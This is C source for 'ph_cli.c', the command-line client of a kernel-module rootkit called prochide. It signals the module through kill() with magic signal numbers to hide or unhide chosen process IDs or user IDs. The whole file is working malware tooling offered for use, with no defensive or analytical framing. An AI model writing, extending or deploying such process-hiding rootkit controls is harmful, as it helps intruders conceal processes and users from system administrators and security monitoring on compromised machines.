/*
 * prochide command line client
 *
 * file: ph_cli.c
 *
 * CLI for prochide LKM.
 *
 * Very rough 1st draft client. show/hide pid,
 * or userid. Execute w/ no CLI args for usage.
 *
 * mike@gravitino.net
 */

#include <stdio.h>
#include <unistd.h>
#include <signal.h>

/*
 * show/hide signum values
 */
#define HIDEPID 0x400000
#define SHOWPID 0x400001
#define HIDEUID 0x400002
#define SHOWUID 0x400003

#define MODE_NONE 0x0
#define MODE_SHOW 0x1
#define MODE_HIDE 0x2

#define TYPE_NONE 0x0
#define TYPE_PID  0x1
#define TYPE_UID  0x2

void usage (char *name)
{
	printf("* USAGE: %s: <-s | -h> & <-p pid | -u uid>\n"
	       "*************************************************\n", name);
}

int
main(int argc, char *argv[])
{
	char ch;
	char *p_target = NULL;
	int  target;
	int  mode = MODE_NONE;
	int  type = TYPE_NONE;
	int  flag;
	int  ret;

	printf("*************************************************\n"
	       "* prochide v0.1 - mike@gravitino.net\n"
	       "*************************************************\n");

	if(argc != 4)
	{
		usage(argv[0]);
		return(0);
	}

	opterr = 0;

	/*
	 * parse command line args..
	 */
	while((ch = getopt(argc, argv, "hsp:u:")) != -1)
	{
		switch(ch)
		{
			case 'p':
				p_target = optarg;
				type     = TYPE_PID;
				break;
			case 'u':
				p_target = optarg;
				type     = TYPE_UID;
				break;
			case 'h':
				mode = MODE_HIDE;
				break;
			case 's':
				mode = MODE_SHOW;
				break;
			case '?':
				usage(argv[0]);
				return(0);
		}
	}

	if(mode == MODE_NONE ||
	   type == TYPE_NONE)
	{
		usage(argv[0]);
		return(0);
	}

	/*
	 * figure out flag value..
	 */
	if(mode == MODE_SHOW)
	{
		flag = (type == TYPE_PID ? SHOWPID : SHOWUID);
	}
	else
	{
		flag = (type == TYPE_PID ? HIDEPID : HIDEUID);
	}

	target = atoi(p_target);
	if(target == 0)
	{
		usage(argv[0]);
		return(0);
	}

	/*
	 * call kill to show hide
	 */
	ret = kill(target, flag);

	switch(flag)
	{
		case SHOWPID:
			printf("* pid %d %s", 
			       target, 
			       (ret == 0 ? "shown" : "NOT shown"));
			break;
		case HIDEPID:
			printf("* pid %d %s",
			       target,
			       (ret == 0 ? "hidden" : "NOT hidden"));
			break;	
		case SHOWUID:
			printf("* uid %d %s",
			       target,
			       (ret == 0 ? "shown" : "NOT shown"));
			break;
		case HIDEUID:
			printf("* uid %d %s",
			       target,
			       (ret == 0 ? "hidden" : "NOT hidden"));
			break;
	}

	printf(".\n************************************************\n");

	return(0);
}


